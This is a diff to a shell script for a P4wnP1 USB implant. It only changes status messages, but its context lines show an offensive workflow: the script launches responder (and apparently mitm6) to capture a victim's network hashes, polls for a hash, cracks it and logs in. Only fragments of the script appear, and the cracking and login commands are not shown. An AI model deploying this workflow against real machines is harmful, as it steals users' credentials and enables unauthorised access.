@@ -16,7 +16,7 @@ tmux new-session -d -s responder 'responder -I usbeth -wFP'
 
 # We launched the processes, make the led blink slowly
 P4wnP1_cli led -b 1
-echo "Tools now running"
+echo "[+] Tools now running, waiting for hash..."
 
 # Now we wait for a victim user to connect, so we keep running the Dumper command every second
 loop=1
@@ -28,7 +28,7 @@ while [ $loop ]; do
 	if [ -n "$output" ]; then
 
 		# If it exists, blink faster
-		echo "Hash has been found...cracking..."
+		echo "[+] Hash has been found...cracking..."
 		P4wnP1_cli led -b 50
 
 		# Let's crack the hash
@@ -40,7 +40,7 @@ while [ $loop ]; do
 
 		# Check if there has been a cracked hash
 		if [ -n "$cracked" ]; then
-			echo "Hash has been cracked! Logging in..."
+			echo "[+] Hash has been cracked! Logging in..."
 
 			# Turn the LED solid
 			P4wnP1_cli led -b 255
@@ -55,7 +55,7 @@ while [ $loop ]; do
 		# Regardless of whether a hash was cracked or not, kill the tmux sessions to stop the attack
 		tmux kill-session -t mitm6
 		tmux kill-session -t responder
-		echo "Attack completed >:) Goodbye!"
+		echo "[+] Attack completed >:) Goodbye!"
 		exit
 	fi
 
